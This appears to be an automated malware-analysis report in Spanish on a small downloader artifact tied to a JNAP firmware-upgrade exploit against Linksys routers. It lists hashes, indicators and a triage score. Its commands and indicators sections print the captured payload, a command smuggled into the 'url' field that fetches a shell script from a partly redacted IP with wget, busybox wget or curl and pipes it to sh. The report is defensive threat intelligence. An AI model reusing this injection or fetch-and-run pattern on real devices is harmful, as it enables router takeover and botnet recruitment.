# 🧬 Payload Analysis

`485a419a754cb518c8c3c85a1aa84bdb2e07d9b2910a61a1a2cc4a715865afc5`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 483 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `485a419a754cb518c8c3c85a1aa84bdb2e07d9b2910a61a1a2cc4a715865afc5`
- **SHA1:** `47e1551958e4572e80c42c0c5ea0f5cc12c8a083`
- **MD5:** `beaab33be1f6f18fa439430a0d2f3f8b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 483 B |
| Entropía | 5.42 |
| Strings | 7 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap3%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap3 | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd%20/tmp%3Bwget%20http://91.92.40 | strings |
| hash | 485a419a754cb518c8c3c85a1aa84bdb2e07d9b2910a61a1a2cc4a715865afc5 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
